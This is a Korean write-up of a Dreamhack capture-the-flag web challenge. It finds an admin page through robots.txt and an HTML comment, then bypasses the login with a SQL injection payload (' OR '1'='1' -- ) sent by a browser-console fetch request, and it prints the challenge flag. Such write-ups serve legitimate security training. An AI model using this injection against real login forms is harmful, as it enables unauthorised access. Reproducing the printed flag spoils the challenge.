# Dreamhack - 슉슉 버거
https://dreamhack.io/wargame/challenges/2726
## 풀이

1. `robots.txt` 확인

User-agent: *
Disallow: /admin

→ `/admin` 관리자 페이지 발견

2. `/admin` 접속 후 `Ctrl + U` 로 HTML 확인

주석에서 힌트 발견
임시 폼
나중에 백엔드 고칠 것! (직원 ID: admin)

→ 관리자 ID = `admin`

3. 숨겨진 로그인 폼 존재

```html
<form action="/admin" method="POST">

브라우저 콘솔에서 POST 요청 전송

fetch("/admin", {
  method: "POST",
  headers: {"Content-Type":"application/x-www-form-urlencoded"},
  body: "username=admin&password=' OR '1'='1' -- "
}).then(r=>r.text()).then(console.log)

관리자 페이지 접근 → flag 확인

Flag
DH{shuk_shuk_b4ckd00r_1s_0p3n}
